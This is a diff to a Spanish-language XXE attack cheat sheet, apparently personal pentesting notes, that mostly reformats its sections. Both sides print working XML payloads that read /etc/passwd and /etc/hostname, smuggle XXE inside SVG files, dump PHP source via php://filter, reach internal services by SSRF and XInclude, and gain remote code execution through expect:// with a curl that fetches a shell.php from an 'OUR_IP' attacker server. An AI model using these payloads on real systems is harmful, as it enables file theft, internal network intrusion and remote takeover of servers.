@@ -13,63 +13,67 @@ Para llamar a la nueva entidad rellenamos el campo del xml con "&variable;"
 Si el formulario es vulnerable mostrará el dato de la entidad, de no serlo mostrará &variable;
 
 
-######## Leer archivos del sistema:
-<!DOCTYPE email [
-  <!ENTITY company SYSTEM "file:///etc/passwd">
-]>
+#### Leer archivos del sistema:
+        <!DOCTYPE email [
+          <!ENTITY company SYSTEM "file:///etc/passwd">
+        ]>
 
-leer archivos mediante un svg:
-creamos un svg con el siguiente contenido:
+#### Leer archivos mediante un svg:
 
-
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<svg>&xxe;</svg>
-
-Opción2:
-
-<?xml version="1.0" standalone="yes"?>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
-<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
-
-######## Obtener el código de la página php:
-<!DOCTYPE email [
-  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
-]>
+#### creamos un svg con el siguiente contenido:
 
 
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+        <svg>&xxe;</svg>
 
-#########################SSRF
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+##### Opción2:
 
-#########################XInclude
+        <?xml version="1.0" standalone="yes"?>
+        <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+        <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+#### Obtener el código de la página php:
+            <!DOCTYPE email [
+          <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+        ]>
+
+
+
+#### SSRF
+podemos injectar ssrfs en el xml con el fin de alcanzar servicios internos no expuestos.
+
+        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+
+#### XInclude
 
 De a ratos nos encontramos con sitios que al hacer una request nos piden datos que luego serán parseados en el back-
 end para agrergarse a un xml. ¿Cómo las distinguimos? No sabemos, simplemente hay que probar.
 Para hacer una xxe, reemplazamos el parámetro que se está enviando por:
-<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
 
-######## RCE:
-1)Si el módulo de php expect está instalado y permitido podríamos usar directamente: "expect://'comando'"
+        <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
 
-2)Podemos generar una injección de una shell:
-a)creamos la shell.php
-b)Levantamos un servidor
-c) inyectamos el siguiente código:
-<?xml version="1.0"?>
-<!DOCTYPE email [
-  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
-]>
-<root>
-<name></name>
-<tel></tel>
-<email>&company;</email>
-<message></message>
-</root>
+#### RCE:
+##### 1)Si el módulo de php expect está instalado y permitido podríamos usar directamente: "expect://'comando'"
+
+##### 2)Podemos generar una injección de una shell:
+###### a)creamos la shell.php
+###### b)Levantamos un servidor
+###### c) inyectamos el siguiente código:
+        <?xml version="1.0"?>
+        <!DOCTYPE email [
+          <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+        ]>
+        <root>
+        <name></name>
+        <tel></tel>
+        <email>&company;</email>
+        <message></message>
+        </root>
 
 
 #########ssrf
-podemos injectar ssrfs en el xml con el fin de alcanzar servicios internos no expuestos.
+
 
 
 ###########################################Lectura avanzada de archivos:
